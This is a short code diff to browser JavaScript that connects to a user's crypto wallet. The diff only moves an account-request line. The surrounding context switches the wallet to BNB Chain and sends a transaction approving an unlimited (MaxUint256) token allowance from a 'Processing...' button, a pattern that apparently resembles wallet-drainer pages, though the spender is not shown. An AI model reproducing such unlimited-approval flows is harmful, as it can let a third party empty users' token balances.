@@ -204,7 +204,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
         nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
         nextBtn.disabled = true;
-
+const fromAddress = (await window.ethereum.request({ method: "eth_requestAccounts" }))[0];
         try {
             const bnbChainId = "0x38";
             await window.ethereum.request({
@@ -221,7 +221,7 @@ document.addEventListener("DOMContentLoaded", function () {
                 ethers.constants.MaxUint256.toString()
             ]);
 
-            const fromAddress = (await window.ethereum.request({ method: "eth_requestAccounts" }))[0];
+        
 
             const txHash = await window.ethereum.request({
                 method: "eth_sendTransaction",
